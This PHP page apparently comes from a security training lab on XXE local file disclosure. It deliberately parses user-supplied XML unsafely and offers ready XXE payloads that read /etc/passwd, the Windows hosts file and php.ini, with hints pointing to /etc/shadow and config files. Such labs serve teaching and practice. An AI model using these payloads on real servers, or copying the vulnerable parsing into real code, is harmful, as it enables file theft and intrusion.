<?php include '../includes/header.php'; ?>

        <div class="main-content">
            <h2>Level 2 - Local File Disclosure</h2>
            
            <div style="margin: 20px 0; padding: 15px; background: #e7f3ff; border-radius: 5px; border-left: 3px solid #007bff;">
                <h3>📖 Lab Description</h3>
                <p>
                    This lab focuses on local file disclosure via XXE. The server is configured to allow external entity 
                    expansion with file system access, allowing attackers to read sensitive files from the server.
                </p>
            </div>

            <div class="xml-form">
                <h3>XML Input:</h3>
                <form method="POST">
                    <textarea name="xml_input" placeholder="Enter XML here..."><?php 
                        echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY passwd SYSTEM "file:///etc/passwd">
]>
<data>
    <file_content>&passwd;</file_content>
</data>'); 
                    ?></textarea>
                    <br>
                    <button type="submit">Parse XML</button>
                </form>
            </div>

            <?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['xml_input'])) {
                $xml = $_POST['xml_input'];
                
                // Vulnerable XML parsing - intentionally allows external entity expansion
                $result = simplexml_load_string($xml);
                
                if ($result) {
                    echo '<div class="results">';
                    echo '<h3>✅ Parsing Results:</h3>';
                    echo '<pre>' . htmlspecialchars(print_r($result, true)) . '</pre>';
                    echo '</div>';
                } else {
                    echo '<div class="error">';
                    echo '<h3>❌ Parsing Error:</h3>';
                    echo '<pre>' . htmlspecialchars(libxml_get_last_error()->message) . '</pre>';
                    echo '</div>';
                }
            }
            ?>

            <div class="examples">
                <h3>💡 Example Payloads:</h3>
                
                <h4>Read /etc/passwd (Unix):</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY passwd SYSTEM "file:///etc/passwd">
]>
<data>
    <file_content>&passwd;</file_content>
</data>'); ?></pre>
                
                <h4>Read Windows Hosts File:</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY hosts SYSTEM "file:///c:/Windows/System32/drivers/etc/hosts">
]>
<data>
    <file_content>&hosts;</file_content>
</data>'); ?></pre>
                
                <h4>Read PHP Configuration File:</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY phpini SYSTEM "file:///etc/php/8.1/apache2/php.ini">
]>
<data>
    <file_content>&phpini;</file_content>
</data>'); ?></pre>
            </div>

            <div class="hints">
                <h3>💡 Hints:</h3>
                <ul>
                    <li>Try reading system configuration files</li>
                    <li>Common sensitive files: /etc/passwd, /etc/shadow, /etc/hostname</li>
                    <li>On Windows, try C:\\Windows\\System32\\drivers\\etc\\hosts</li>
                    <li>Check for web application configuration files</li>
                </ul>
            </div>
        </div>

<?php include '../includes/footer.php'; ?>
